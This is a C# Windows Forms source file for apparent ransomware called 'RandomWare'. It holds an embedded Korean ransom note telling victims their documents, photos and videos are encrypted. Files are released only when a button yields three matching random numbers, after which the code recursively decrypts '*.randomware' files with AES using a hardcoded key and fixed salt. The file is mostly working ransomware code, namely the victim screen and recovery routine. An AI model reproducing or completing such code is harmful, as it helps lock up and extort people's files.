using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace RandomWare
{
    public partial class Form1 : Form
    {
        Random random = new Random();
        string key;
        string userpath;
        public Form1(string _key,string _userpath)
        {
            if ((_key==""||_userpath=="")|| (_key == null || _userpath == null))
            {
                MessageBox.Show("Error");
                return;
            }
            key = _key;
            userpath = _userpath;
            InitializeComponent();
            this.Text = "RandomWare";
            StringBuilder text = new StringBuilder();
            text.Append(@"{\rtf1\ansi\ansicpg949\deff0\nouicompat\deflang1033\deflangfe1042{\fonttbl{\f0\fnil\fcharset129 \'b8\'bc\'c0\'ba \'b0\'ed\'b5\'f1;}}
{\*\generator Riched20 10.0.18362}\viewkind4\uc1 
\pard\sl240\slmult1\b\f0\fs20\lang1042\'b3\'bb \'c4\'c4\'c7\'bb\'c5\'cd\'bf\'a1 \'b9\'ab\'bd\'bc \'c0\'cf\'c0\'cc \'c0\'cf\'be\'ee\'b3\'b5\'b3\'aa\'bf\'e4?\par
\b0\'b4\'e7\'bd\'c5\'c0\'ba Randomware\'bf\'a1 \'b0\'a8\'bf\'b0\'b5\'c7\'be\'fa\'bd\'c0\'b4\'cf\'b4\'d9.\par
\'c1\'df\'bf\'e4\'c7\'d1 \'c6\'c4\'c0\'cf\'b5\'e9\'c0\'cc \'be\'cf\'c8\'a3\'c8\'ad\'b5\'c7\'be\'fa\'bd\'c0\'b4\'cf\'b4\'d9.\par
\'b9\'ae\'bc\'ad, \'bb\'e7\'c1\'f8, \'b5\'bf\'bf\'b5\'bb\'f3 \'b1\'e2\'c5\'b8 \'c6\'c4\'c0\'cf\'b5\'e9\'c0\'cc \'b8\'f0\'b5\'ce \'be\'cf\'c8\'a3\'c8\'ad \'b5\'c7\'be\'ee \'be\'d7\'bc\'bc\'bd\'ba \'c7\'d2 \'bc\'f6 \'be\'f8\'bd\'c0\'b4\'cf\'b4\'d9.\par
\par
\b\'c6\'c4\'c0\'cf\'c0\'bb \'ba\'b9\'c8\'a3\'c8\'ad \'c7\'d2 \'bc\'f6 \'c0\'d6\'bd\'c0\'b4\'cf\'b1\'ee?\b0\par
\'b3\'d7, \'b9\'d8 CLICK \'b9\'f6\'c6\'b0\'c0\'bb \'b4\'ad\'b7\'af \'bc\'bc \'bc\'fd\'c0\'da\'b0\'a1 \'b8\'f0\'b5\'ce \'b0\'b0\'c0\'ba \'bc\'f6\'b0\'a1 \'b3\'aa\'bf\'c0\'b8\'e9 \'b5\'cb\'b4\'cf\'b4\'d9.\lang18\par
}");
            richTextBox1.Rtf = text.ToString();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            bool IsMouse = (e is System.Windows.Forms.MouseEventArgs);
            if (!IsMouse)
                return;
            label2.Text =random.Next(1,10).ToString();
            label3.Text = random.Next(1, 10).ToString();
            label4.Text = random.Next(1, 10).ToString();

            if(label2.Text.Equals(label3.Text)&&label3.Text.Equals(label4.Text))
            {
                button1.Enabled = false;
                MessageBox.Show("세 숫자가 같습니다.\n복호화를 시작합니다.");
                DecryptDirectory(key, userpath);
                MessageBox.Show("복호화가 완료 되었습니다.\n프로그램을 종료합니다.");

                Application.Exit();

            }
        }

        void DecryptDirectory(string password,string path)
        {
            DirectoryInfo d = new DirectoryInfo(path);
            FileInfo[] Files = d.GetFiles("*.randomware", SearchOption.AllDirectories); //Getting Text files
            foreach (FileInfo file in Files)
            {
                DecryptFile("testkey1", file.FullName);
            }
        }
        byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
        {
            byte[] decryptedBytes = null;

            // Set your salt here, change it to meet your flavor:
            // The salt bytes must be at least 8 bytes.
            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };

            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {

                    AES.KeySize = 256;
                    AES.BlockSize = 128;

                    var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                    AES.Key = key.GetBytes(AES.KeySize / 8);
                    AES.IV = key.GetBytes(AES.BlockSize / 8);

                    AES.Mode = CipherMode.CBC;

                    using (var cs = new CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
                        cs.Close();
                    }
                    decryptedBytes = ms.ToArray();


                }
            }

            return decryptedBytes;
        }

        public void DecryptFile(string password, string file)
        {

            byte[] bytesToBeDecrypted = File.ReadAllBytes(file);
            byte[] passwordBytes = Encoding.UTF8.GetBytes(password);
            passwordBytes = SHA256.Create().ComputeHash(passwordBytes);

            byte[] bytesDecrypted = AES_Decrypt(bytesToBeDecrypted, passwordBytes);

            File.WriteAllBytes(file, bytesDecrypted);
            string extension = Path.GetExtension(file);
            string result = file.Substring(0, file.Length - extension.Length);
            File.Move(file, result);

        }
        
    }
}
